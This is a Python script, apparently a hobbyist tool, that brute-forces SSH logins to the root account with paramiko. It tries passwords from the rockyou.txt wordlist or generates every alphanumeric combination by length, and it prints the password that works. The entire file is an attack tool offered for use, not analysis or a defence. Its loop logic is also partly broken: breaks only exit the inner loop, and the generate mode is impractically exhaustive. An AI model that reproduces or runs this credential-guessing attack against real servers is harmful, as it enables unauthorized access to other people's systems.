import paramiko
import itertools


def ssh_connection(ip : str, username : str, password : str) -> bool:
    # create ssh connection
    ssh = paramiko.SSHClient()
    # add to known hosts
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connect to server
    try:
        ssh.connect(ip, username=username, password=password)
        print("Connected to succesfully \nPaswword is {}".format(password))
        return True
    except paramiko.AuthenticationException:
        print("Authentication failed, please verify your credentials")
    except:
        print("Could not connect to server")

    # close connection
    ssh.close()
    return False

def generate_password(length : int):
    # generate password with length = i
    password = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    # generate list of passwords contains a-z, A-Z, 0-9
    passwords = itertools.product(password, repeat=length)
    return ["".join(password) for password in passwords]

# use rockyou.txt wordlist friom kali linux
def read_wordlist() -> list:
    with open("/usr/share/wordlists/rockyou.txt", encoding='latin-1') as f:
        passwords = f.readlines()
    # replace \n with ""
    passwords = [password.replace("\n", "") for password in passwords]
    return passwords

def main(type : str):
    ip = ""
    username = "root"
    if type == "generate":
        for i in range(1,1000):
            passwords = generate_password(i)
            for password in passwords:
                print("Trying password {}".format(password))
                if ssh_connection(ip, username, password):
                    break
    elif type == "read":
        passwords = read_wordlist()
        for password in passwords:
            print("Trying password {}".format(password))
            if ssh_connection(ip, username, password):
                break
